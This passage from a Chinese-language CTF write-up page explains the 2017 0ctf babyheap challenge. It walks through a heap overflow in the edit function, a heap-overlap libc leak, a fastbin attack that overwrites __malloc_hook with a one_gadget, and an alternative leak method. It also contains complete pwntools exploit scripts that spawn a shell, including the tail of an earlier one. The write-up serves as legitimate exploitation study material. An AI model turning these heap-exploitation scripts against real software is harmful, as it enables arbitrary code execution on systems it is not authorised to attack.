    <span class="n">Index</span><span class="p">(</span><span class="s1">&#39; s &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>
    <span class="n">Index</span><span class="p">(</span><span class="s1">&#39; k &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>


    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span>
<span class="sd">    constraints:</span>
<span class="sd">      rax == NULL</span>

<span class="sd">    0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span>
<span class="sd">    constraints:</span>
<span class="sd">      [rsp+0x30] == NULL</span>

<span class="sd">    0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span>
<span class="sd">    constraints:</span>
<span class="sd">      [rsp+0x50] == NULL</span>

<span class="sd">    0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span>
<span class="sd">    constraints:</span>
<span class="sd">      [rsp+0x70] == NULL</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="c1"># gdb.attach(p)</span>
    <span class="n">Index</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf1207</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x1b</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>




    <span class="c1"># gdb.attach(p)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>
<h2 id="2017-0ctf-babyheap">2017 0ctf babyheap<a class="headerlink" href="#2017-0ctf-babyheap" title="Permanent link">&para;</a></h2>
<h3 id="_23">基本情况<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre></div>
</td></tr></table>
<p>保护全开，RELRO 全开，got 表不能修改。</p>
<h3 id="_24">基本功能<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
<p>程序是一个堆管理器，有增删查改功能。</p>
<p>结构体：</p>
<div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="p">{</span>
    <span class="kt">int</span> <span class="n">inuse</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">chunk_ptr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>限制申请 chunk 上限为 16 个，大小小于等于 4096 字节即可。四大功能都是根据 chunk 下标进行操作。</p>
<h3 id="_25">漏洞<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
<p>在修改函数中，修改的大小是自行输入的，并不是读取结构体中 chunk size ，造成了堆溢出问题。</p>
<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">my_write</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">index</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Index: &quot;</span><span class="p">);</span>
  <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">index</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">index</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span><span class="c1">// 检查下标范围</span>
  <span class="p">{</span>
    <span class="n">index</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="mf">24L</span><span class="n">L</span> <span class="o">*</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">index</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span><span class="c1">// 提取chunk指针</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">index</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>                   <span class="c1">// 检查inuse位</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Size: &quot;</span><span class="p">);</span>
      <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
      <span class="n">size</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>              <span class="c1">// 检查size大于0</span>
      <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Content: &quot;</span><span class="p">);</span>
        <span class="n">index</span> <span class="o">=</span> <span class="n">write_chunk</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mf">24L</span><span class="n">L</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">16</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span><span class="c1">// 堆溢出，没有对size进行检查</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">index</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_26">思路<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
<p>利用堆溢出，造成堆重叠（通过 extend 向前合并），泄露出 libc 地址。再次利用堆溢出，造成 fastbin attack（Arbitray Alloc），修改 __malloc_hook 为 onegadget 。</p>
<p>创建非 fastbin 的 chunk0、2 触发 unlink 合并为一个整体；被重叠 chunk1 用于读取 libc 地址；保护避免与 topchunk 合并的 chunk3 。</p>
<p>释放 chunk0 ，修改 chunk1 溢出覆盖 chunk2 的 prev_size 和 size_inuse ，释放 chunk2 触发 unlink 合并。</p>
<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#0</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#1</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#2</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#3</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xb0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">dump</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">leak_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
</code></pre></div>
<p>申请 0x60 fastbin chunk 之后就是常规的修改 fastbin fd 指针达到任意写的操作。这里偏移构造 size 位我选择 0x23 。</p>
<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#3</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span><span class="c1">#4</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="c1">#5</span>
<span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0xa0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">)</span>
<span class="c1"># write(3,len(payload),payload)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="c1">#5</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="c1">#6</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x23</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>

<span class="n">creat</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
</code></pre></div>
<h4 id="unsortedbin-fastbin">伪造 unsortedbin 为 fastbin<a class="headerlink" href="#unsortedbin-fastbin" title="Permanent link">&para;</a></h4>
<p>这是另外一个思路泄露出 libc 地址，前面是用 unlink 机制实现的一个堆重叠。这里用 wiki 的方法，通过修改 fastbin fd 指针，配合修改 chunk header 信息，将一个 inuse 的 unsorted bin 放入到 fastbin ，重新申请出来，实现两个指针指向一个地址。</p>
<p>布置好堆情况：</p>
<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#溢出修改下一个chunk header</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#fastbin</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#fastbin</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#溢出修改下一个chunk header</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#被放入fastbin的chunk</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="c1">#防止unsortedbin与topchunk合并</span>

<span class="c1">#布置fastbin</span>
<span class="c1">#chunk1-&gt;chunk2-&gt;0</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>
<p>然后修改 fastbin fd 指针指向 unsorted bin</p>
<div class="highlight"><pre><span></span><code><span class="c1">#fastbin:chunk1-&gt;chunk4-&gt;0</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span>
<span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<p>然后将 unsorted bin 的 chunk size 修改为所在的 fastbin 大小，从而绕过 fastbin 申请时的检查：</p>
<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<p>fastbin 申请检查源码：</p>
<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">))</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="p">{</span>
    <span class="n">errstr</span> <span class="o">=</span> <span class="s">&quot;malloc(): memory corruption (fast)&quot;</span><span class="p">;</span>
<span class="nl">errout</span><span class="p">:</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="n">errstr</span><span class="p">,</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">),</span> <span class="n">av</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>申请两次 fastbin ，将 unsorted bin 申请出来。然后需要将 unsorted bin 的 chunk_size 修改为正确大小，才能成功释放：</p>
<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>

<span class="c1">#修复chunk_size </span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

<span class="n">dump</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div>
<h3 id="exp_2">EXP<a class="headerlink" href="#exp_2" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./babyheap&quot;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./babyheap&quot;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index: &quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>


<span class="c1"># ex</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#0</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#1</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#2</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#3</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xb0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">dump</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">leak_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="o">-</span><span class="mh">0x3c4b78</span>
<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
<span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45226</span><span class="p">,</span><span class="mh">0x4527a</span><span class="p">,</span><span class="mh">0xf0364</span><span class="p">,</span><span class="mh">0xf1207</span><span class="p">]</span>
<span class="n">onegadget</span> <span class="o">=</span> <span class="n">one</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;malloc_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;onegadget:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">onegadget</span><span class="p">))</span>


<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#3</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span><span class="c1">#4</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="c1">#5</span>
<span class="n">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0xa0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">)</span>
<span class="c1"># write(3,len(payload),payload)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="c1">#5</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="c1">#6</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x23</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">)</span>

<span class="n">create</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>



<span class="c1"># gdb.attach(p,&quot;b *$rebase (0x119F)&quot;)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../../..",
          features: {'tabs': True},
          search: Object.assign({
            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
    
  </body>
</html>